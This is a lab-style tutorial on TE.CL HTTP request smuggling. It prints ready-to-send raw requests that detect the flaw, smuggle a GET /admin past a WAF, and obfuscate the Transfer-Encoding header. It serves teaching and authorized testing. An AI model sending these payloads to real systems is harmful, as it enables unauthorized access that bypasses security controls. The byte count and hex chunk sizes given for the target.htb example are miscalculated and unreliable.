# 🔄 TE.CL Request Smuggling

## Overview

TE.CL vulnerabilities occur when:
- **Front-end (Reverse Proxy/WAF)**: Uses `Transfer-Encoding: chunked`
- **Back-end (Web Server)**: Uses `Content-Length`

This creates an opportunity to **bypass WAFs** and other security controls.

---

## Burp Suite Configuration

### ⚠️ Critical Setup Required

Before testing TE.CL, configure Burp Repeater:

### 1. Disable Auto Content-Length Update

1. In Repeater, click **Settings** icon (⚙️) next to Send button
2. **Uncheck** "Update Content-Length"

```
[Settings Icon] → ☐ Update Content-Length
```

### 2. Create Tab Group for Sequential Requests

1. Right-click request tab → **Add tab to group** → **Create tab group**
2. Add both test requests to the group
3. Click arrow next to Send → **Send group in sequence (single connection)**

```
[Send ▼] → "Send group in sequence (single connection)"
```

This sends all requests via the **same TCP connection** - essential for TE.CL exploitation.

---

## Foundation

### The Core Concept

Consider this request:

```http
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0

```

### Front-end Perspective (Uses TE)

The front-end parses chunked encoding:

```
Chunk 1: size=5, data="HELLO"
Chunk 2: size=0 (terminator)
```

**Result**: Complete request, forwards all bytes to back-end.

### Back-end Perspective (Uses CL)

The back-end sees `Content-Length: 3` and parses:

```
Body: "5\r\n"  (3 bytes)
```

**Leftover in TCP buffer**:
```
HELLO\r\n0\r\n\r\n
```

These bytes become the **beginning of the next request**.

---

## Attack Scenario

### Step 1: Attacker Sends Smuggling Request

```http
POST / HTTP/1.1
Host: tecl.htb
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0

```

### Step 2: Victim/Probe Request

```http
GET / HTTP/1.1
Host: tecl.htb
```

### TCP Stream Analysis

**Front-end view** (splits by chunked encoding):

```
[Request 1: POST / with body "HELLO" + empty chunk]
[Request 2: GET / HTTP/1.1 ...]
```

**Back-end view** (splits by Content-Length):

```
[Request 1: POST / with body "5\r\n"]
[Request 2: HELLO\r\n0\r\n\r\nGET / HTTP/1.1 ...]  ← Invalid!
```

### Result

The back-end receives invalid request starting with `HELLO` → **400 Bad Request**

---

## Identification

### Test Requests

**Request 1** (Tab 1 - Smuggling):

```http
POST / HTTP/1.1
Host: <TARGET>
Content-Length: 3
Transfer-Encoding: chunked

5
HELLO
0

```

**Request 2** (Tab 2 - Probe):

```http
GET / HTTP/1.1
Host: <TARGET>
```

### Testing Procedure

1. Create tab group with both requests
2. Disable "Update Content-Length"
3. Select "Send group in sequence (single connection)"
4. Click Send

### Confirmation

**Request 1 Response**: Normal (200 OK or expected response)

**Request 2 Response**: 
```
400 Bad Request
"Invalid HTTP request line: 'HELLO'"
```

If Request 2 shows this error → **Vulnerable to TE.CL**

---

## WAF Bypass Exploitation

### Scenario

- WAF blocks requests containing `/admin` in URL
- Goal: Access `/admin` panel

### The Bypass Technique

Send requests that WAF sees as benign, but back-end interprets differently.

### Exploit Requests

**Request 1** (Smuggling):

```http
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

27
GET /admin HTTP/1.1
Host: tecl.htb

0

```

**Request 2** (Trigger):

```http
GET /404 HTTP/1.1
Host: tecl.htb
```

### Chunk Size Calculation

The chunk size `27` (hex) = 39 (decimal) bytes:

```
GET /admin HTTP/1.1\r\n     = 21 bytes
Host: tecl.htb\r\n          = 16 bytes
\r\n                        = 2 bytes
                            ─────────
                            39 bytes = 0x27
```

---

## TCP Stream Analysis

### WAF View (Uses TE)

```
[Request 1]
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Transfer-Encoding: chunked

Chunk: 0x27 bytes = "GET /admin HTTP/1.1\r\nHost: tecl.htb\r\n\r\n"
Empty chunk: terminates body

[Request 2]
GET /404 HTTP/1.1
Host: tecl.htb
```

**WAF sees**: Two requests to `/404` → **No blocking** (no `/admin` in URLs)

### Back-end View (Uses CL)

```
[Request 1]
GET /404 HTTP/1.1
Host: tecl.htb
Content-Length: 4
Body: "27\r\n"

[Request 2 - SMUGGLED]
GET /admin HTTP/1.1
Host: tecl.htb

[Request 3]
0\r\n\r\nGET /404 HTTP/1.1...  (invalid)
```

**Back-end sees**: 
1. GET /404 → 404 response
2. GET /admin → **Admin panel!** ✅
3. Invalid request → error

---

## Response Mapping

| Request Sent | WAF Sees | Back-end Processes | Response Received |
|--------------|----------|-------------------|-------------------|
| Request 1 | GET /404 | GET /404 | 404 Not Found |
| Request 2 | GET /404 | GET /admin | **200 OK (Admin!)** |

The response to Request 2 contains the admin panel content!

---

## Calculating Chunk Size

### Method: Character Count

1. Write the smuggled request (without chunk size line)
2. Count all characters including `\r\n`
3. Convert decimal to hexadecimal

### Example

```http
GET /admin HTTP/1.1\r\n
Host: target.htb\r\n
\r\n
```

**Counting**:
```
G E T   / a d m  i  n     H  T  T  P  /  1  .  1  \r \n
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22

H  o  s  t  :     t  a  r  g  e  t  .  h  t  b  \r \n
23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40

\r \n
41 42
```

**Total**: 42 bytes = **0x2a** in hex

### Quick Method in Burp

1. Highlight the smuggled request text
2. Check character count at bottom of Burp
3. Use calculator: decimal → hex

```
51 decimal = 33 hex
39 decimal = 27 hex
```

---

## Complete Attack Flow Diagram

```
┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
│   Attacker  │                  │  WAF/Proxy  │                  │  Back-end   │
└──────┬──────┘                  │  (Uses TE)  │                  │  (Uses CL)  │
       │                         └──────┬──────┘                  └──────┬──────┘
       │                                │                                │
       │ Request 1: GET /404            │                                │
       │ CL: 4, TE: chunked             │                                │
       │ Chunk: "GET /admin..."         │                                │
       │───────────────────────────────>│                                │
       │                                │                                │
       │                                │ Parses TE: chunked             │
       │                                │ Sees: GET /404                 │
       │                                │ Body chunk contains smuggled   │
       │                                │ No "/admin" in URL → ALLOW     │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Parses CL: 4
       │                                │                                │ Body: "27\r\n"
       │                                │                                │ 
       │                                │                                │ Smuggled left:
       │                                │                                │ "GET /admin..."
       │                                │                                │
       │ Request 2: GET /404            │                                │
       │───────────────────────────────>│                                │
       │                                │ Sees: GET /404 → ALLOW         │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Prepends smuggled
       │                                │                                │ Processes: GET /admin
       │                                │                                │
       │<───────────────────────────────│<───────────────────────────────│
       │     Response: Admin Panel!     │                                │
```

---

## TE.TE to TE.CL Conversion

Sometimes you need to **obfuscate TE header** to create TE.CL scenario:

### Using Substring Match

```http
GET /404 HTTP/1.1
Host: target.htb
Content-Length: 4
Transfer-Encoding: asdchunked

33
GET /admin HTTP/1.1
Host: target.htb

0

```

The `asdchunked` obfuscation:
- **Front-end**: May still parse as chunked (substring match)
- **Back-end**: Ignores invalid TE, uses CL

---

## Server Logs Evidence

When exploitation succeeds, back-end logs show:

```
[DEBUG] GET /404
[DEBUG] GET /admin              ← Smuggled request!
[DEBUG] Invalid request from ip=127.0.0.1: Invalid HTTP request line: ''
```

Three requests logged, but only two were "sent".

---

## Tips & Tricks

### Content-Length Values

| CL Value | Includes |
|----------|----------|
| 3 | `5\r\n` (chunk size + CRLF) |
| 4 | `27\r\n` (two-digit chunk + CRLF) |

### Common Pitfalls

1. ❌ Forgetting to disable "Update Content-Length"
2. ❌ Not using single connection for requests
3. ❌ Wrong chunk size calculation
4. ❌ Missing trailing `\r\n` after smuggled request

### Verification

Check if responses are swapped:
- Request 1 gets Request 2's expected response
- Request 2 gets smuggled request's response

---

## Differences from CL.TE

| Aspect | CL.TE | TE.CL |
|--------|-------|-------|
| Front-end uses | Content-Length | Transfer-Encoding |
| Back-end uses | Transfer-Encoding | Content-Length |
| Smuggled data location | After empty chunk | In chunk body |
| CL header manipulation | Set to include smuggled | Set to exclude smuggled |
| Common use case | Force user actions | **WAF bypass** |

---

## Lab Walkthrough Summary

1. **Identify** blocked endpoint (e.g., `/admin` returns "Unauthorized")
2. **Configure Burp**: Disable auto CL, create tab group
3. **Test** for TE.CL using POST + GET technique
4. **Calculate** chunk size for smuggled request
5. **Craft** two GET /404 requests with smuggled `/admin`
6. **Send** in sequence via single connection
7. **Check** Response 2 for admin panel content

---

## References

- [PortSwigger - TE.CL Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks - James Kettle](https://portswigger.net/research/http-desync-attacks)
- [WAF Bypass via Request Smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)

